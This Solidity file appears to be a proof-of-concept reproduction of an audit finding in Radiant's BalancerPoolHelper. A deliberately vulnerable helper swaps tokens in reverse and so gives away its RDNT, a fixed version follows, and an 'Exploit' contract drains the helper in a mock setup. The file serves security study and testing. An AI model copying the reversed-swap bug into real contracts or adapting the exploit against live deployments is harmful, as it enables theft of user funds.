// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.27;

// Radiant C-01 (Pashov). BalancerPoolHelper.swapWethToRdnt is supposed to swap
// WETH for RDNT. The quoted call passes the tokens in reverse, so the helper
// sells its RDNT inventory and pays the caller in WETH.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

contract Erc20 {
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory s) {
        symbol = s;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BalancerPool {
    function swap(address tokenOut, uint256 amountIn, address recipient) external returns (uint256 amountOut) {
        amountOut = amountIn;
        require(IERC20(tokenOut).transfer(recipient, amountOut), "pool out");
    }
}

contract BalancerPoolHelper {
    address public immutable RDNT_ADDRESS;
    address public immutable REAL_WETH_ADDR;
    address public immutable pool;
    bytes32 public constant WETH_RDNT_POOL_ID = keccak256("WETH-RDNT");
    uint256 public spentRdnt;
    uint256 public wethOut;

    constructor(address rdnt, address weth, address _pool) {
        RDNT_ADDRESS = rdnt;
        REAL_WETH_ADDR = weth;
        pool = _pool;
    }

    /// Quoted bug: tokenIn is RDNT and tokenOut is WETH.
    function swapWethToRdnt(uint256 _wethAmount, uint256 _minAmountOut) external returns (uint256 amountOut) {
        // @> VULN: input and output tokens are reversed (RDNT -> WETH)
        amountOut = this._swap(RDNT_ADDRESS, REAL_WETH_ADDR, _wethAmount, _minAmountOut, WETH_RDNT_POOL_ID, msg.sender);
    }

    function _swap(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 minOut,
        bytes32, /*poolId*/
        address recipient
    ) external returns (uint256 amountOut) {
        require(msg.sender == address(this), "only self");
        require(amountIn != 0, "amount");
        require(IERC20(tokenIn).transfer(pool, amountIn), "pull in");
        amountOut = BalancerPool(pool).swap(tokenOut, amountIn, recipient);
        require(amountOut >= minOut, "slippage");
        spentRdnt = amountIn;
        wethOut = amountOut;
    }
}

contract BalancerPoolHelperFixed {
    address public immutable RDNT_ADDRESS;
    address public immutable REAL_WETH_ADDR;
    address public immutable pool;
    bytes32 public constant WETH_RDNT_POOL_ID = keccak256("WETH-RDNT");

    constructor(address rdnt, address weth, address _pool) {
        RDNT_ADDRESS = rdnt;
        REAL_WETH_ADDR = weth;
        pool = _pool;
    }

    function swapWethToRdnt(uint256 _wethAmount, uint256 _minAmountOut) external returns (uint256 amountOut) {
        amountOut = this._swap(REAL_WETH_ADDR, RDNT_ADDRESS, _wethAmount, _minAmountOut, WETH_RDNT_POOL_ID, msg.sender);
    }

    function _swap(
        address tokenIn,
        address tokenOut,
        uint256 amountIn,
        uint256 minOut,
        bytes32,
        address recipient
    ) external returns (uint256 amountOut) {
        require(msg.sender == address(this), "only self");
        require(IERC20(tokenIn).transfer(pool, amountIn), "pull in");
        amountOut = BalancerPool(pool).swap(tokenOut, amountIn, recipient);
        require(amountOut >= minOut, "slippage");
    }
}

contract Exploit {
    uint256 internal constant AMOUNT = 100 ether;

    Erc20 public weth;
    Erc20 public rdnt;
    BalancerPool public pool;
    BalancerPoolHelper public helper;

    constructor() {
        weth = new Erc20("WETH");
        rdnt = new Erc20("RDNT");
        pool = new BalancerPool();
        helper = new BalancerPoolHelper(address(rdnt), address(weth), address(pool));
        weth.mint(address(pool), 1000 ether);
        rdnt.mint(address(pool), 1000 ether);
        rdnt.mint(address(helper), AMOUNT);
    }

    function run() external {
        uint256 out = helper.swapWethToRdnt(AMOUNT, 0);
        require(out == AMOUNT, "out");
        require(weth.balanceOf(address(this)) == AMOUNT, "weth");
        require(rdnt.balanceOf(address(helper)) == 0, "rdnt");
        require(helper.spentRdnt() == AMOUNT, "spent");
    }
}
